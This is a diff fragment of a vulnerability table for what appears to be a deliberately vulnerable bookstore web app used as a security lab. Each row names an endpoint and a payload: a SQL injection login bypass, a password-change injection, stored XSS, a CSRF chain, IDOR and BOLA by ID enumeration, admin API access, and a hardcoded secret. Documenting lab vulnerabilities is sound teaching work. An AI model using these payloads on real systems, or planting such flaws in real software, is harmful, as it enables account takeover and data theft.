-| 10 | Misconfiguration | Security Misconfig | Gây lỗi SQL | Error message + stack trace |
+| 1 | SQLi login bypass | SQLi | `POST /api/login` | `' UNION SELECT 1,'admin','a@b.c','','admin','active' --` |
+| 2 | SQLi đổi pass | SQLi | `POST /api/profile/password` | currentPassword: `' OR '1'='1'--` |
+| 3 | Stored XSS | XSS | Review sách | `<img src=x onerror="...">` |
+| 4 | CSRF chain | CSRF+XSS+SQLi | Review sách → `/api/profile/password` | Stored XSS auto-submit |
+| 5 | IDOR | Broken Access | `GET /api/profile/user-info?userId=` | `userId=1,2,3...` |
+| 6 | Admin API access control | Broken Access | `/api/admin/dashboard`, `/api/admin/categories` | User thường gọi API admin trực tiếp |
+| 7 | Admin support chat takeover | Secret Exposure + BAC | `/api/admin/support-chat` | `secret=dev-secret-key-change-me` |
+| 8 | Shop coupon BOLA | Broken Access | `GET /api/profile/shop-coupons?shopId=` | `shopId=1,2,3...` |
